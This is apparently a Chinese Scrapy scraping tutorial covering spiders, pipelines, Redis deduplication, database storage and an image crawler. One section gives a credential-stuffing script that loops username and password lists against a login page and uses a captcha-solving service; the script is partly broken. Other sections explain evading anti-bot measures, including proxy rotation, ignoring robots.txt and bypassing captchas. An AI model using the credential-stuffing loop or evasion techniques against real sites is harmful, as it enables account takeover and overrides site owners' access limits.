            # 匹配//div[@class="job-primary"]节点下./div[@class="info-publis"]节点下,也就是匹配到包含发布人信息的div元素
            info_publis = job_primary.xpath('./div[@class="info-publis"]')
            item['recruiter'] = info_publis.xpath('./h3/text()').extract_first()
            item['publish_date'] = info_publis.xpath('./p/text()').extract_first()

            # 使用yield语句将item对象返回给scrapy引擎。此处不能使用return,因为return会导致整个方法返回,循环不能继续执行,而yield将会创建一个生成器
            yield item

'''
3、编写pipelines.py文件,该文件负责将所爬取的数据写入文件或数据库中
Spider使用yield将item返回给scrapy引擎之后,scrapy引擎将这些item收集起来传给项目的Pipeline,因此自然就到了使用scrapy开发爬虫的第二步。
现在开始修改pipelines.py文件。为了简化开发,只在控制台打印item数据。下面是修改后的pipelines.py文件的内容。
process_item()方法的item、spider参数都由scrapy引擎传入,scrapy引擎会自动将Spider捕获的所有item逐个传给process_item()方法,因此该方法只需处理单个的item即可,不管爬虫总共爬取了多少个item,process_item()方法只处理一个即可
'''
class ZhipinspiderPipeline(object):
    def process_item(self, item, spider):
        print("工作:", item['title'])
        print("工资:", item['salary'])
        print("工作地点:", item['work_addr'])
        print("详情链接:", item['url'])
        print("公司:", item['company'])
        print("行业:", item['industry'])
        print("公司规模:", item['company_size'])
        print("招聘人:", item['recruiter'])
        print("发布日期:", item['publish_date'])

'''
经过上面三个步骤,基于scrapy的爬虫基本开发完成。下面还需要修改settings.py文件进行一些简单的配置,比如增加User-Agent头。取消settings.py文件中如下代码行的注释,并将这些代码行改为如下形式:
'''
BOT_NAME = 'ZhipinSpider'

SPIDER_MODULES = ['ZhipinSpider.spiders']
NEWSPIDER_MODULE = 'ZhipinSpider.spiders'
ROBOTSTXT_OBEY = True
# 配置默认的请求头
DEFAULT_REQUEST_HEADERS = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0",
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
}
# 配置使用Pipeline
ITEM_PIPELINES = {
    'ZhipinSpider.pipelines.ZhipinspiderPipeline': 300,
}

'''
回顾一下上面的开发过程,使用scrapy开发爬虫的核心工作就是三步:
1、定义Item类。由于Item只是一个DTO对象,因此定义Item类很简单。
2、开发Spider类,这一步是核心。Spider使用XPath从页面中提取项目所需的信息,并用这些信息来封装Item对象。
3、开发Pipeline。Pipeline负责处理Spider获取的Item对象。

经过上面步骤,这个基于scrapy的Spider已经开发完成。在命令行窗口中进入ZhipinSpider项目根目录下,执行如下命令来启动Spider,job_position就是前面定义的Spider名称(通过JobPositionSpider类的name属性指定):
scrapy crawl job_position

爬虫已经顺利爬取了start_urls列表所给出页面中的工作信息。但问题又出现了,该爬虫并未继续爬取下一页的工作信息。
在提取完response中的所有"工作信息"之后,Spider可以使用XPath找到页面中代表"下一页"的链接,然后使用Request发送请求即可自动爬取下一页信息

通过浏览器查看源代码,可以看到https://www.zhipin.com/c101280100/h_101280100/页面中包含分页信息的源代码
页面中"下一页"元素的XPath为//div[@class='page']/a [@class='next'],因此程序需要在JobPositionSpider类的parse(self, response)方法的后面添加如下代码,这样可以保证Spider在爬取页面中所有项目感兴趣的工作信息之后才会向下一个页面发送请求:
'''
new_links = response.xpath('//div[@class="page"]/a[@class="next"]/@href').extract() # 解析下一页的链接
if new_links and len(new_links) > 0:
    new_link = new_links[0]  # 获取下一页的链接
    yield scrapy.Request("https://www.zhipin.com" + new_link, callback=self.parse) # 再次发送请求获取下一页数据

'''

显式使用scrapy.Request发送请求,并指定使用self.parse方法来解析服务器响应数据。这是一个递归操作,即每当Spider解析完页面中项目感兴趣的工作信息之后,它总会再次请求"下一页"数据,通过这种方式即可爬取广州地区所有的热门职位信息

再次运行scrapy crawl job_position命令来启动爬虫,即可看到该爬虫成功爬取了10页职位信息,这是因为该页面默认只提供10页职位信息

保存为csv、xml、json格式可以直接使用命令:
scrapy crawl job_position -o job_position.csv
scrapy crawl job_position -o job_position.xml
scrapy crawl job_position -o job_position.json

保存的文件中出现中文乱码时修改编码方式
scrapy crawl job_position -o job_position.json -s FEED_EXPORT_ENCODING=UTF8

'''

</textarea><pre>
【 增量式爬取和数据更新 数据清洗过滤去重 爬虫定时增量更新数据 】
概念：通过爬虫程序监测某网站数据更新的情况,以便可以爬取到该网站更新出的新数据

可以从几种思路入手：
在发送请求之前判断这个URL是不是之前爬取过
在解析内容后判断这部分内容是不是之前爬取过
写入存储介质时判断内容是不是已经在介质中存在

其实增量爬取的核心是去重, 至于去重的操作在哪个步骤起作用,只能说各有利弊,前两种思路需要根据实际情况取一个(也可能都用)
第一种思路适合不断有新页面出现的网站,比如说小说的新章节,每天的最新新闻等
第二种思路则适合页面内容会更新的网站
第三个思路是相当于是最后的一道防线。这样做可以最大程度上达到去重的目的。

去重方法
1,将爬取过程中产生的url进行存储,存储在redis的set中。当下次进行数据爬取时,首先对即将要发起的请求对应的url在存储的url的set中做判断,如果存在则不进行请求,否则才进行请求。
2,对爬取到的网页内容进行唯一标识的制定,然后将该唯一表示存储至redis的set中。当下次爬取到网页数据的时候,在进行持久化存储之前,首先可以先判断该数据的唯一标识在redis的set中是否存在,在决定是否进行持久化存储

最简单的去重方式自然是将所有访问过的URL和其对应的内容保存下来,然后过一段时间重新爬取一次并进行比较,然后决定是否需要覆盖。这显然是不实际的,因为会消耗很多资源。目前比较实际的做法就是给URL或其内容(取决于这个网站采用哪种更新方式)上一个标识,这个标识叫数据指纹。
一种最常见的数据指纹就是哈希值,根据哈希函数的特性,可以为任意内容生成一个独一无二的定长字符串,之后只要比较这个哈希值就行了。哈希值是一个很伟大的发明,几乎在任何地方都有它的影子,它利用数学特性,计算机只要经过简单的计算就可以得到唯一的特征值,这个计算过程的开销基本可以忽略不计,当然这是题外话了。

不过即使用了哈希值,仍需要一个地方存储所有的哈希值,并且要能做到方便的取用。如果存储介质是数据库,一般的数据库系统都能提供索引,如果把哈希值作为唯一索引呢,这应该是可行的。有些数据库也提供查询后再插入的操作,不过本质上应该也是索引。和哈希值类似的还有MD5校验码,殊途同归

除了自建指纹,其实在发送请求时还有一些技巧,比如说304状态码,Last-modified字段,文件大小和MD5签名

综上所述,在数据量不大几百个或几千个的时候,简单自己写个小函数或者利用集合的特性去重就行了。如果数据量够大,数据指纹的价值就体现出来了,它可以节省可观的空间,同时可以引入BloomFilter作为去重的手段。如果要对数据做持久化(简单说就是去重操作不会被事故影响,比如说断电),就需要用到Redis数据库。

</pre>爬取4567tv网站中喜剧片的所有电影的标题和上映年份<textarea>
1. 爬虫文件
# -*- coding: utf-8 -*-
import scrapy
from scrapy.linkextractors import LinkExtractor
from scrapy.spiders import CrawlSpider, Rule
from redis import Redis
from moviePro.items import MovieproItem

class MovieSpider(CrawlSpider):
    name = 'movie'
    # allowed_domains = ['www.xxx.com']
    start_urls = ['https://www.4567tv.tv/index.php/vod/show/id/6/page/23.html']
    rules = (
        Rule(LinkExtractor(allow=r'/index.php/vod/show/id/6/page/\d+.html'), callback='parse_item', follow=True),
    )
    conn = Redis(host='127.0.0.1', port=6379)  # 创建redis链接对象

    def parse_item(self, response):
        li_list = response.xpath('//li[@class="col-md-6 col-sm-4 col-xs-3"]')
        for li in li_list:
            detail_url = 'http://www.4567tv.tv' + li.xpath('./div/a/@href').extract_first()  # 获取详情页的url
            ex = self.conn.sadd('urls', detail_url)  # 将详情页的url存入redis的set中
            # 设置redis的key-value成功时,会返回1,否则返回0
            if ex == 1:
                print('该url没有被爬取过,可以进行数据的爬取')
                yield scrapy.Request(url=detail_url, callback=self.parst_detail)
            else:
                print('数据还没有更新,暂无新数据可爬取！')

    # 解析详情页中的电影名称和类型,进行持久化存储
    def parst_detail(self, response):
        item = MovieproItem()
        item['title'] = response.xpath('//div[@class="stui-content__detail"]/h3[@class="title"]/text()').extract_first()
        item['year'] = response.xpath('//div[@class="stui-content__detail"]/p[1]/a[2]/@href').extract_first()
        yield item

2. items.py
import scrapy
class MovieproItem(scrapy.Item):
    # define the fields for your item here like:
    title = scrapy.Field()
    year = scrapy.Field()

3. pipelines.py
from redis import Redis

class MovieproPipeline(object):
    conn = None
    def open_spider(self, spider):
        self.conn = Redis(host='127.0.0.1', port=6379)

    def process_item(self, item, spider):
        dic = {
            'title': item['title'],
            'year': item['year']
        }
        print(dic)
        self.conn.lpush('movieData', dic)
        return item

</textarea>爬取糗事百科中的段子和作者数据<textarea>
1. 爬虫文件
# -*- coding: utf-8 -*-
import scrapy
from scrapy.linkextractors import LinkExtractor
from scrapy.spiders import CrawlSpider, Rule
from qiubaiZ.items import QiubaizItem
from redis import Redis
import hashlib

class QiubaiSpider(CrawlSpider):
    name = 'qiubaiz'
    # allowed_domains = ['https://www.qiushibaike.com/text/']
    start_urls = ['https://www.qiushibaike.com/text/']

    rules = (
        Rule(LinkExtractor(allow=r'/text/page/\d+/'), callback='parse_item', follow=True),
        Rule(LinkExtractor(allow=r'/text/$'), callback='parse_item', follow=True),
    )
    conn = Redis(host='127.0.0.1', port=6379)  # 创建redis链接对象

    def parse_item(self, response):
        div_list = response.xpath('//div[@id="content-left"]/div')
        for div in div_list:
            item = QiubaizItem()
            author = div.xpath('.//div[@class="author clearfix"]/a/h2/text()')  # 爬取作者
            author = author[0].extract() if author else "匿名用户"
            # 爬取这个用户的段子的内容contents
            contents = div.xpath('.//div[@class="content"]/span/text()')  # 遇到换行br就会生成一个Selector对象
            content = ''.join([selector.extract().strip() for selector in contents])
            item['author'] = author
            item['content'] = content
            source = item['author'] + item['content']  # 设置数据的存储格式
            source_id = hashlib.sha256(source.encode()).hexdigest() # 将解析到的数据值生成一个唯一的标识进行redis存储
            ex = self.conn.sadd('data_id', source_id) # 将解析内容的唯一表示存储到redis的data_id中
            if ex == 1:
                print('该条数据没有爬取过,可以爬取')
                yield item
            else:
                print('该条数据已经爬取过了,不需要再次爬取了!')

2. items.py
class QiubaizItem(scrapy.Item):
    # define the fields for your item here like:
    author = scrapy.Field()
    content = scrapy.Field()

3. pipelines.py
from redis import Redis

class QiubaizPipeline(object):
    conn = None
    def open_spider(self, spider):
        self.conn = Redis(host='127.0.0.1', port=6379)

    def process_item(self, item, spider):
        dic = {
            'author': item['author'],
            'content': item['content']
        }
        self.conn.lpush('qiubaizData', dic)
        return item

</textarea><pre>
【 scrapy爬虫数据存储 】
存储即选用合适的存储媒介来存储爬取到的结果,这里还是分为四种存储方式来进行介绍。
1、文件,如JSON、CSV、TXT、图⽚、视频、⾳频等,常用的一些库有csv、xlwt、json、pandas、pickle、python-docx等。
2、数据库,分为关系型数据库、非关系型数据库,如MySQL、MongoDB、HBase等,常用的库有pymysql、pymssql、redis-py、pymongo、py2neo、thrift。
3、搜索引擎,如Solr、ElasticSearch等,便于检索和实现⽂本匹配,常用的库有elasticsearch、pysolr等。
4、云存储,某些媒体文件可以存到如七⽜云、又拍云、阿里云、腾讯云、Amazon S3等,常用的库有qiniu、upyun、boto、azure-storage、google-cloud-storage 等。

除将爬取到的信息写入文件中之外,程序也可通过修改Pipeline文件将数据保存到数据库中。为了使用数据库来保存爬取到的信息,在MySQL的python数据库中执行如下SQL语句来创建job_inf数据表:

</pre>
CREATE TABLE job_inf (
  id INT (11) NOT NULL AUTO_INCREMENT PRIMARY KEY,
  title VARCHAR (255),
  salary VARCHAR (255),
  company VARCHAR (255),
  url VARCHAR(500),
  work_addr VARCHAR (255),
  industry VARCHAR (255),
  company_size VARCHAR(255),
  recruiter VARCHAR(255),
  publish_date VARCHAR (255)
)

</div>然后将Pipeline文件改为如下形式,即可将爬取到的信息保存到MySQL数据库中<textarea>
# 导入访问MySQL的模块
import pymysql
class ZhipinspiderPipeline(object):
    # 定义构造器,初始化要写入的文件
    def __init__(self):
        self.conn = pymysql.connect(host="localhost",user="admin",password="",database="python",charset="utf8")
        self.cur = self.conn.cursor()
    # 重写close_spider回调方法,用于关闭数据库资源
    def close_spider(self, spider):
        self.cur.close()  # 关闭游标
        self.conn.close() # 关闭连接
    def process_item(self, item, spider):
        self.cur.execute("INSERT INTO job_inf VALUES(null, %s, %s, %s, %s, %s, %s, %s, %s, %s)", (item['title'], item['salary'], item['company'],item['url'], item['work_addr'], item['industry'],item.get('company_size'), item['recruiter'], item['publish_date']))
        self.conn.commit()

</textarea><pre>
程序为该Pipeline类定义了构造器,该构造器可用于初始化数据库连接、游标;程序还为该Pipeline类重写了close_spider()方法,该方法负责关闭构造器中初始化的数据库资源。

使用scrapy crawl job_position命令启动爬虫,当程序运行结束之后将会在python数据库的job_inf表中看到多了300条招聘信息。

【 scrapy突破反爬虫机制 】
对于BOSS直聘这种网站,当程序请求网页后,服务器响应内容包含了整个页面的HTML源代码,这样就可以使用爬虫来爬取数据。但有些网站做了一些"反爬虫"处理,其网页内容不是静态的,而是使用js动态加载的,此时的爬虫程序也需要做相应的改进。

反爬措施分为非浏览器检测(User-Agent)、封IP(同一ip访问过于频繁会被封禁)、验证码(最常见)、封账号(需要登录才能访问的网站可能会才去封号惩罚)、字体反爬等

对于封IP的情况可以分为几种情况来处理：
1、首先寻找手机站点、App站点,如果存在此类站点反爬会相对较弱。
2、使用代理,如抓取免费代理(可用率极低)、购买付费代理(推荐讯代理、阿布云代理、多贝云代理、芝麻代理)、使用Tor代理(暗网代理速度慢)、Socks代理(速度较快)等。
3、在代理的基础上使用免费或付费代理维护自己的代理池,防止代理浪费,保证实时可用。
4、搭建ADSL拨号代理,稳定高效。使用ADSL拨号主机搭建代理池,推荐云立方

验证码分为普通图形验证码、算术题验证码、滑动验证码、点触验证码、手机验证码、扫二维码等
1、对于普通图形验证码,如果非常规整且没有变形或干扰,可以使用OCR识别,也可使用机器学习、深度学习来进行模型训练,当然打码平台是最方便的方式。
2、对于算术题验证码,推荐直接使用打码平台。
3、对于滑动验证码,可以使用破解算法,也可以模拟滑动。后者的关键在于缺口的找寻,可以使用图片比对,也可以写基本的图形识别算法,也可以对接打码平台,也可以使用深度学习训练识别接口。
4、对于点触验证码,推荐使用打码平台。
5、对于手机验证码,可以使用验证码分发平台,也可以购买专门的收码设备,也可以人工验证。
6、对于扫二维码,可以人工扫码,也可以对接打码平台

</pre>将带图形验证码的接口撞库场景应用<textarea>
import requests
import base64
import json

username = open('username.txt','r')
passwd = open('password.txt','r')

# 联众打码平台https://www.jsdati.com/login
def uploadCaptcha(self, captchaImgName):
  headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0',
    'Content-Type': 'multipart/form-data; boundary=---------------------------227973204131376',
    'Connection': 'keep-alive',
    'Host': 'v2api.jsdama.com',
    'Upgrade-Insecure-Requests': '1'
  }

  data = dict(softwareId="", softwareSecret="", username="", password="", captchaData=base64(captchaImgName), captchaType=1001, captchaMinLength=0, captchaMaxLength=0, workerTipsId=0)

  api_url = 'https://v2-api.jsdama.com/upload'
  captcha_dict = json.loads(requests.post(url=api_url, data=data, headers=headers, verify=False))
  return captcha_dict['recognition']

#cookie验证方式登录
def tryLogin(self, captchaURL, loginURL, username, password):
  headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0',
    'Content-Type': 'multipart/form-data; boundary=---------------------------227973204131376',
    'Connection': 'keep-alive',
    'Host': 'v2api.jsdama.com',
    'Upgrade-Insecure-Requests': '1'
  }

  valcode =requests.get(captchaURL)
  f = open('captchaCode.png', 'wb')
  f.write(valcode.content)
  f.close()
  code = uploadCaptcha(base64(str(valcode.content)))

  data = {
    'username': username,
    'password': password,
    'captcha': code
  }

  r = requests.post(loginURL, data=data, cookies=requests.utils.dict_from_cookiejar(valcode.cookies), vertify=False)

  isFind = False
  if "failed" in r.content:     # 这里是对应网站的密码验证逻辑
    print('尝试密码', password, '登陆失败')
    isFind = False
  else:
    print (username, '登陆成功', 'password = ', pwd)
    isFind = True
  return isFind

if __name__ == '__main__':
  for user in username.readline():
    for pwd in passwd.readline():
      if tryLogin('http://www.xxx.com/img', 'http://wwww.xxx.com/login', user, pwd):
        break;

</textarea><pre>
封账号
某些网站需要登录才能爬取,但一个账号登录之后请求过于频繁会被封号,为了避免封号,可以采取如下措施：
1、寻找手机站点或 App站点,此种类别通常是接口形式,校验较弱。
2、寻找无登录接口,尽可能寻找⽆无需登录即可爬取的接口。
3、维护Cookies池,使⽤用批量账号模拟登录,使⽤时随机挑选可用Cookies使⽤即可,实现：https://github.com/Python3WebSpider/CookiesPool。

使用shell调试工具分析目标站点
本项目爬取的目标站点是https://unsplash.com/,该网站包含了大量高清、优美的图片,本项目的目标是爬虫程序能自动识别并下载该网站上的所有图片

在开发该项目之前,依然先使用Firefox浏览该网站,查看该网站的源代码,将会看到页面的body元素几乎是空的,并没有包含任何图片。
使用scrapy的shell调试工具来看看该页面的内容,在控制台输入scrapy shell https://unsplash.com/命令启动shell调试,可以看到scrapy成功下载了服务器响应数据。接下来通过如下命令来尝试获取所有图片的src属性
response.xpath('//img/@src').extract()
执行上面命令,将会看到返回一系列图片的URL,但它们都不是高清图片的URL。

还是通过"Ctrl+Shift+I"快捷键打开Firefox的调试控制台,再次向https://unsplash.com/网站发送请求,接下来可以在Firefox的调试控制台中请求
可见该网页动态请求图片的URL如下:https://unsplash.com/napi/photos?page=4&per_page=12
上面URL中的page代表第几页,per_page代表每页加载的图片数。使用scrapy的shell调试工具来调试该网址,输入如下命令:
scrapy shell https://unsplash.com/napi/photos?page=1&per_page=10
上面命令代表请求第1页,每页显示10张图片的响应数据。执行上面命令,服务器响应内容是一段JSON数据,接下来在shell调试工具中输入如下命令:
>>> import json
>>> len(json.loads(response.text))
10

从上面的调试结果可以看到,服务器响应内容是一个JSON数组(转换之后对应于Python的list列表),且该数组中包含10个元素。

使用Firefox直接请求https://unsplash.com/napi/photos?page=1&per_page=12地址(更专业的工具则可选择Postman),可以看到服务器响应内容为所有图片的JSON数据,每张图片数据都包含id、created_at(创建时间)、updated_at(更新时间)、width(图片宽度)、height(图片高度)等基本信息和一个links属性,该属性值是一个对象(转换之后对应于Python的dict),它包含了self、html、download、download_location属性,其中self代表浏览网页时的图片的URL;而download才是要下载的高清图片的URL。

尝试在shell调试工具中查看第一张图片的下载URL,应该在shell调试工具中输入如下命令:
>>> json.loads(response.text)[0]['links']['download']
'https://unsplash.com/photos/-RMY4j97SsM/download'

由此得到一个结论,该网页加载时会自动向https://unsplash.com/napi/photos?age=N&per_page=N发送请求,然后根据服务器响应的JSON数据来动态加载图片。

由于该网页是"瀑布流"设计(所谓"瀑布流"设计就是网页没有传统的分页按钮,而是让用户通过滚动条来实现分页,当用户向下拖动滚动条时程序会动态载入新的分页),在Firefox中拖动滚动条时,可以在Firefox的调试控制台中看到再次向https://unsplash.com/napi/photos?page=N&per_page=N发送了请求,只是page参数发生了改变。可见为了不断地加载新的图片,程序只要不断地向该URL发送请求,并改变page参数即可。

经过以上分析,下面开始正式使用scrapy来实现爬取高清图片

使用scrapy爬取高清图片
按照惯例,使用如下命令来创建一个scrapy项目即创建一个scrapy文件夹:
scrapy startproject UnsplashimageSpider

然后在命令行窗口中进入UnsplashlmageSpider项目根目录,执行如下命令来生成Spider类:
scrapy genspider 文件名 要爬取的网址
scrapy genspider unsplash_image 'unsplash.com'

上面两个命令执行完成之后,一个简单的scrapy项目就创建好了。

接下来需要修改UnsplashImageSpider\items.py、UnsplashImageSpider\pipelines.py、UnsplashImageSpider\spiders\unsplash_image.py、UnsplashImageSpider\settings.py文件,将它们全部改为使用UTF-8字符集来保存。

</pre>现在按照如下步骤来开发该爬虫项目<textarea>
# 1、定义Item类。由于本项目的目标是爬取高清图片,因此其所使用的Item类比较简单,只要保存图片id和图片下载地址即可
import scrapy
class ImageItem(scrapy.Item):
    image_id = scrapy.Field()  # 保存图片id
    download = scrapy.Field()  # 保存图片下载地址

# 2、开发Spider。开发Spider就是指定scrapy发送请求的URL,并实现parse(self, response)方法来解析服务器响应数据。
import scrapy, json
from UnsplashimageSpider.items import UnsplashimagespiderItem as ImageItem

class UnsplashImageSpider(scrapy.Spider):
    name = 'unsplash_image'
    allowed_domains = ['unsplash.com']
    start_urls = ['https://unsplash.com/napi/photos?page=1&per_page=12']  # 指定的URL是本项目爬取的第一个页面

    def __init__ (self):
        self.page_index = 1

    def parse(self, response):
        # 解析服务器响应的JSON字符串,由于该页面的响应是一个JSON数据,因此程序无须使用XPath或CSS选择器来"提取"数据,而是直接使用json模块的loads()函数来加载该响应数据即可
        photo_list = json.loads(response.text) # ①
        # 遍历每张图片,在获取JSON响应数据之后,程序同样将JSON数据封装成Item对象后返回给Scrapy引擎
        # Spider到底应该使用XPath或CSS选择器来提取响应数据还是使用JSON,完全取决于目标网站的响应内容总之,提取到数据之后,将数据封装成Item对象后返回给Scrapy引擎就对了
        for photo in photo_list:
            item = ImageItem()
            item['image_id'] = photo['id']
            item['download'] = photo['urls']['raw']
            yield item

        # 定义了加载下一页数据的URL,接下来使用scrapy.Request向该URL发送请求,并指定使用self.parse方法来处理服务器响应内容,这样程序就可以不断地请求下一页的图片数据
        self.page_index += 1
        next_link = 'https://unsplash.com/napi/photos?page=' + str(self.page_index) + '&per_page=12'  # 获取下一页的链接
        yield scrapy.Request(next_link, callback=self.parse)                 # 继续获取下一页的图片

# 3、开发Pipeline。Pipeline负责保存Spider返回的Item对象(封装了爬取到的数据)。本项目爬取的目标是图片,因此程序得到图片的URL之后,既可将这些URL地址导入专门的下载工具中批量下载,也可在Python程序中直接下载,本项目的Pipeline将使用urllib.request包直接下载
from urllib.request import *

class UnsplashimagespiderPipeline(object):
    def process_item(self, item, spider):      # 每个item代表一个要下载的图片
        print('----------' + item['image_id'] + ': ' + item['download'])
        try:
            with urlopen(item['download']) as result:                          # 打开URL对应的资源
                data = result.read()                                           # 读取图片数据
                with open("images/" + item['image_id'] + '.jpg', 'wb+') as f:  # 打开图片文件,images目录位于项目根目录下
                    f.write(data)                                              # 写入读取的数据
        except Exception as e:
            print('下载图片%s出现错误:' % item['image_id'], e)

# 经过上面3步,基于scrapy开发的高清图片爬取程序基本完成。接下来依然需要对settings.py文件进行修改,即增加一些自定义请求头(用于模拟浏览器),设置启用指定的Pipeline。下面是本项目修改后settings.p文件:
BOT_NAME = 'UnsplashImageSpider'
SPIDER_MODULES = ['UnsplashImageSpider.spiders']
NEWSPIDER_MODULE = 'UnsplashImageSpider.spiders'
ROBOTSTXT_OBEY = True
# 配置默认的请求头
DEFAULT_REQUEST_HEADERS = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0",
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
}
# 配置使用Pipeline
ITEM_PIPELINES = {
    'UnsplashImageSpider.pipelines.UnsplashimagespiderPipeline': 300,
}

至此这个可以爬取高清图片的爬虫项目开发完成,在UnsplashlmageSpider目录下执行如下命令来启动爬虫。
scrapy crawl unsplash_image

运行该爬虫程序之后,可以看到在项目的images目录下不断地增加新的高清图片(对图片的爬取速度在很大程度上取决于网络下载速度),这些高清图片正是https://unsplash.com网站中所展示的图片。

</textarea><pre>
【 Scrapy反爬虫常见解决方案(包含5种方法) 】
爬虫的本质就是"抓取"第二方网站中有价值的数据,因此每个网站都会或多或少地采用一些反爬虫技术来防范爬虫。比如通过User-Agent请求头验证是否为浏览器、使用js动态加载资源等,这些都是常规的反爬虫手段。下面针对更强的反爬虫技术提供一些解决方案。

1、IP地址验证
有些网站会使用IP地址验证进行反爬虫处理,网站程序会检查客户端的IP地址,如果发现同一个IP地址的客户端频繁地请求数据就会判断该客户端是爬虫程序。
针对这种情况可以让Scrapy不断地随机更换代理服务器的IP地址,这样就可以欺骗目标网站了。

为了让Scrapy能随机更换代理服务器,可以自定义一个下载中间件,让该下载中间件随机更换代理服务器即可。

</pre>Scrapy随机更换代理服务器只要两步<textarea>
# 1、打开Scrapy项目下的middlewares.py文件,在该文件中增加定义如下类:
class RandomProxyMiddleware (object) :
    #动态设置代理服务器的IP地址
    def process_request (self, request, spider):
        request.meta["proxy"] = get_random_proxy()

# 上面程序通过自定义的下载中间件为Scrapy设置了代理服务器。程序中的自定义的get_random_proxy()函数需要能随机返回代理服务器的IP地址和端口,这就需要开发者事先准备好一系列代理服务器,该函数能随机从这些代理服务器中选择一个。

# 2、通过settings.py文件设置启用自定义的下载中间件。在settings.py文件中增加如下配置代码:
# 配置自定义的下载中间件
DOWNLOADER MIDDLEWARES = {
    'ZhipinSpider.middlewares.RandomProxyMiddleware': 543,
}

</textarea><pre>
2、禁用Cookie
有些网站可以通过跟踪Cookie来识别是否是同一个客户端。Scrapy默认开启了Cookie,这样目标网站就可以根据Cookie来识别爬虫程序是同一个客户端。

目标网站可以判断,如果同一个客户端在单位时间内的请求过于频繁则基本可以断定这个客户端不是正常用户,很有可能是程序操作(比如爬虫),此时目标网站就可以禁用该客户端的访问。

针对这种情况,可以让Scrapy禁用 Cookie(Scrapy不需要登录时才可禁用Cookie)。在settings.py文件中取消如下代码的注释即可禁用Cookie:
COOKIES_ENABLED = False

3、违反爬虫规则文件
在很多Web站点目录下都会提供一个robots.txt文件,在该文件中制定了一系列爬虫规则。如Weibo.com网站下的robots.txt文件的内容如下:
Sitemap: http://weibo.com/sitemap.xml User-Agent: Baiduspider Disallow : User-agent : 360Spider Disallow : User-agent : Googlebot Disallow : User-agent : Sogou web spider Disallow : User-agent:bingbot Disallow : User-agent : smspider Disallow : User-ageηt : HaosouSpider Disallow : User-agent : YisouSpider Disallow : User-agent : * Disallow : /

该规则文件指定该站点只接受Baidu的网络爬虫,不接受其他爬虫程序。
为了让爬虫程序违反爬虫规则文件的限制,强行爬取站点信息,可以在settings文件中取消如下代码的注释来违反站点制定的爬虫规则:
# 指定不遵守爬虫规则
ROBOTSTXT_OBEY = False

4、限制访问频率
当同一个IP地址、同一个客户端访问目标网站过于频繁时,其很可能会被当成机器程序(比如爬虫)禁止访问。

为了更好地模拟正常用户的访问速度,可以限制Scrapy的访问频率。在settings文件中取消如下代码的注释即可限制Scrapy的访问频率:

# 开启访问频率限制
AUTOTHROTTLE_ENABLED = True
# 设置访问开始的延迟
AUTOTHROTTLE_START DELAY = 5
# 设置访问之间的最大延迟
AUTOTHROTTLE_MAX DELAY = 60
# 设置Scrapy并行发给每台远程服务器的请求数量
AUTOTHROTTLE_TARGET CONCURRENCY= 1.0
# 设置下裁之后的自动延迟
DOWNLOAD_DELAY = 3

5、图形验证码
有些网站为了防止机器程序访问会做一些很"变态"的设计,它会记录同一个客户端、同一个IP地址的访问次数,只要达到一定的访问次数,目标网站就会弹出一个图形验证码让输入,只有成功输入了图形验证码才能继续访问。

为了让机器识别这些图形验证码,通常有两种解决方式:
1、使用PIL、Libsvrn等库自己开发程序来识别图形验证码,这种方式具有最大的灵活性,只是需要开发人员自己编码实现。
2、通过第三方识别。有不少图形验证码的在线识别网站,它们的识别率基本可以做到90%以上。但是识别率高的在线识别网站通常都要收费,而免费的往往识别率不高,还不如自己写程序来识别。

【 爬虫加速 】
当爬取的数据量非常大时,如何高效快速地进行数据抓取是关键。
常见的措施有多线程、多进程、异步、分布式、细节优化等。
爬虫是网络请求密集型任务,所以使用多进程和多线程可以大大提高抓取效率,如使用threading、multiprocessing等。
将爬取过程改成非阻塞形式,当有响应式再进行处理,否则在等待时间内可以运行其他任务,如使用asyncio、aiohttp、Tornado、Twisted、gevent、grequests、pyppeteer、pyspider、Scrapy等
分布式的关键在于共享爬取队列,可以使用celery、huey、rq、rabbitmq、kafka等来实现任务队列的对接,也可以使用现成的框架pyspider、Scrapy-Redis、Scrapy-Cluster等。

可以采取某些优化措施来实现爬取的加速,如：
1、DNS缓存,节省DNS解析时间
2、使用更快的解析方法,如BeautifulSoup的lxml模式比html5lib模式快很多
3、使用更高效的去重方法,如基于redis去重相对更高效,对接BloomFilter实现更快更省空间的去重方法
4、模块分离化管控

架构
如果搭建了分布式,要实现高效的爬取和管理调度、监控等操作,可以使用两种架构来维护爬虫项目。
1、将Scrapy项目打包为Docker镜像,使用K8S控制调度过程。
2、将Scrapy项目部署到Scrapyd,使用专用的管理工具如SpiderKeeper、Gerapy等管理

</pre>

<h4>Scrapy Selenium整合:启动浏览器并登陆</h4><pre>
某些网站要求用户必须先登录,然后才能获取网络数据,这样爬虫程序将无法随意爬取数据。

为了登录该网站,记录登录后的Cookie数据,通常有两种做法:
1、直接用爬虫程序向网站的登录处理程序提交请求,将用户名、密码、验证码等作为请求参数,登录成功后记录登录后的Cookie数据。
需要爬虫开发人员自己来处理网站登录、Cookie管理等复杂行为。这种方式的优点是完全由自己来控制程序,因此爬虫效率高、灵活性好;缺点是编程麻烦,尤其是当目标网站有非常强的反爬虫机制时,爬虫开发人员要花费大量的时间来处理。

2、使用真正的浏览器来模拟登录,然后记录浏览器登录之后的Cookie数据。
完全使用真正的浏览器(比如Firefox、Chrome等)来模拟登录。这种方式的优点是简单、易用,而且几乎可以轻松登录所有网站(因为本来就是用浏览器登录的,正常用户怎么访问,爬虫启动的浏览器也怎么访问);缺点是需要启动浏览器,用浏览器加载页面,因此效率较低。

在使用Scrapy开发爬虫程序时经常会整合Selenium来启动浏览器登录。
